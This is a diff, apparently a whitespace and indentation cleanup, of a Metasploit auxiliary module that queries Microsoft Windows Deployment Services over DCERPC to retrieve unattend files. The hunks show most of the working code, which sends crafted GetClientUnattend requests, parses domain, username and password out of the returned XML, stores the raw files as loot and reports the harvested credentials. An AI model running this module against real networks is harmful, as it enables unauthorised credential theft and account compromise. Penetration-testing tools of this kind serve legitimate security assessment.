@@ -15,13 +15,13 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Exploit::Remote::DCERPC
 	include Msf::Auxiliary::Report
 	include Msf::Auxiliary::Scanner
-	
+
 	DCERPCPacket   	= Rex::Proto::DCERPC::Packet
 	DCERPCClient   	= Rex::Proto::DCERPC::Client
 	DCERPCResponse 	= Rex::Proto::DCERPC::Response
 	DCERPCUUID     	= Rex::Proto::DCERPC::UUID
 	WDS_CONST 	= Rex::Proto::DCERPC::WDSCP::Constants
-	
+
 	def initialize(info = {})
 		super(update_info(info,
 			'Name'           => 'Microsoft Windows Deployment Services Unattend Retrieval',
@@ -43,15 +43,15 @@ class Metasploit3 < Msf::Auxiliary
 			[
 				Opt::RPORT(5040),
 			], self.class)
-		
+
 		deregister_options('RHOST', 'CHOST', 'CPORT', 'SSL', 'SSLVersion')
-			
+
 		register_advanced_options(
 			[
 				OptBool.new('ENUM_ARM', [true, 'Enumerate Unattend for ARM architectures (not currently supported by Windows and will cause an error in System Event Log)', false])
-			], self.class)	
+			], self.class)
 	end
-	
+
 	def run_host(ip)
 			begin
 				query_host(ip)
@@ -62,20 +62,19 @@ class Metasploit3 < Msf::Auxiliary
 			end
 	end
 
-	
 	def query_host(rhost)
 		# Create a handler with our UUID and Transfer Syntax
 		self.handle = Rex::Proto::DCERPC::Handle.new(	[
-									WDS_CONST::WDSCP_RPC_UUID, 
+									WDS_CONST::WDSCP_RPC_UUID,
 									'1.0',
-									'71710533-beba-4937-8319-b5dbef9ccc36', 
+									'71710533-beba-4937-8319-b5dbef9ccc36',
 									1
 								],
-								'ncacn_ip_tcp', 
-								rhost, 
+								'ncacn_ip_tcp',
+								rhost,
 								[datastore['RPORT']]
 							)
-		
+
 		print_status("Binding to #{handle} ...")
 
 		self.dcerpc = Rex::Proto::DCERPC::Client.new(self.handle, self.sock)
@@ -88,33 +87,33 @@ class Metasploit3 < Msf::Auxiliary
 				:name => "dcerpc",
 				:info => "#{WDS_CONST::WDSCP_RPC_UUID} v1.0 Windows Deployment Services"
 		)
-		
+
 		table = Rex::Ui::Text::Table.new({
-                        'Header' => 'Windows Deployment Services',
-                        'Indent' => 1,
-                        'Columns' => ['Architecture', 'Type', 'Domain', 'Username', 'Password']
-	        })
-		
+			'Header' => 'Windows Deployment Services',
+			'Indent' => 1,
+			'Columns' => ['Architecture', 'Type', 'Domain', 'Username', 'Password']
+		})
+
 		creds_found = false
-		
+
 		WDS_CONST::ARCHITECTURE.each do |architecture|
 			if architecture[0] == :ARM && !datastore['ENUM_ARM']
 				vprint_status "Skipping #{architecture[0]} architecture due to adv option"
 				next
 			end
-		
-			begin	
+
+			begin
 				result = request_client_unattend(architecture)
-                        rescue ::Rex::Proto::DCERPC::Exceptions::Fault => e
-                                vprint_error(e.to_s)
+			rescue ::Rex::Proto::DCERPC::Exceptions::Fault => e
+				vprint_error(e.to_s)
 				print_error("#{rhost} DCERPC Fault - Windows Deployment Services is present but not configured. Perhaps an SCCM installation.")
 				return
 			end
-			
+
 			unless result.nil?
 				loot_unattend(architecture[0], result)
 				results = parse_client_unattend(result)
-				
+
 				results.each do |result|
 					unless result.empty?
 						unless result['username'].nil? || result['password'].nil?
@@ -129,21 +128,21 @@ class Metasploit3 < Msf::Auxiliary
 				end
 			end
 		end
-		
+
 		if creds_found
 			print_line
-			table.print 
+			table.print
 			print_line
 		else
 			print_error("No Unattend files received, service is unlikely to be configured for completely unattended installation.")
 		end
 	end
-	
-	def request_client_unattend(architecture)	
-		# Construct WDS Control Protocol Message		
+
+	def request_client_unattend(architecture)
+		# Construct WDS Control Protocol Message
 		packet = Rex::Proto::DCERPC::WDSCP::Packet.new(:REQUEST, :GET_CLIENT_UNATTEND)
-		packet.add_var(	WDS_CONST::VAR_NAME_ARCHITECTURE, [architecture[1]].pack('C'))			
-		packet.add_var(	WDS_CONST::VAR_NAME_CLIENT_GUID, 
+		packet.add_var(	WDS_CONST::VAR_NAME_ARCHITECTURE, [architecture[1]].pack('C'))
+		packet.add_var(	WDS_CONST::VAR_NAME_CLIENT_GUID,
 						"\x35\x00\x36\x00\x34\x00\x44\x00\x41\x00\x36\x00\x31\x00\x44\x00"\
 						"\x32\x00\x41\x00\x45\x00\x31\x00\x41\x00\x41\x00\x42\x00\x32\x00"\
 						"\x38\x00\x36\x00\x34\x00\x46\x00\x34\x00\x34\x00\x46\x00\x32\x00"\
@@ -155,16 +154,16 @@ class Metasploit3 < Msf::Auxiliary
 						"\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x35\x00\x30\x00"\
 						"\x35\x00\x36\x00\x33\x00\x35\x00\x31\x00\x41\x00\x37\x00\x35\x00"\
 						"\x00\x00")
-		packet.add_var(	WDS_CONST::VAR_NAME_VERSION,"\x00\x00\x00\x01\x00\x00\x00\x00")	
+		packet.add_var(	WDS_CONST::VAR_NAME_VERSION,"\x00\x00\x00\x01\x00\x00\x00\x00")
 		wdsc_packet = packet.create
-		
+
 		print_status("Sending #{architecture[0]} Client Unattend request ...")
 		response = dcerpc.call(0, wdsc_packet)
 
 		if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
 			vprint_status('Received response ...')
 			data = dcerpc.last_response.stub_data
-			
+
 			# Check WDSC_Operation_Header OpCode-ErrorCode is success 0x000000
 			op_error_code = data.unpack('i*')[18]
 			if op_error_code == 0
@@ -181,13 +180,13 @@ class Metasploit3 < Msf::Auxiliary
 			end
 		end
 	end
-	
+
 	def extract_unattend(data)
-		start = data.index('<?xml')		
+		start = data.index('<?xml')
 		finish = data.index('</unattend>')+10
 		return data[start..finish]
 	end
-	
+
 	def parse_client_unattend(data)
 		begin
 			xml = REXML::Document.new(data)
@@ -196,16 +195,16 @@ class Metasploit3 < Msf::Auxiliary
 					print_error("Invalid XML format")
 					vprint_line(e.message)
 			end
-    
+
 		return Rex::Parser::Unattend.parse(xml).flatten
 	end
-	
+
 	def loot_unattend(archi, data)
-			return if data.empty?	
+			return if data.empty?
 			p = store_loot('windows.unattend.raw', 'text/plain', rhost, data, archi, "Windows Deployment Services")
 			print_status("Raw version of #{archi} saved as: #{p}")
 	end
-	
+
 	def report_creds(domain, user, pass)
 		report_auth_info(
 				:host  => rhost,
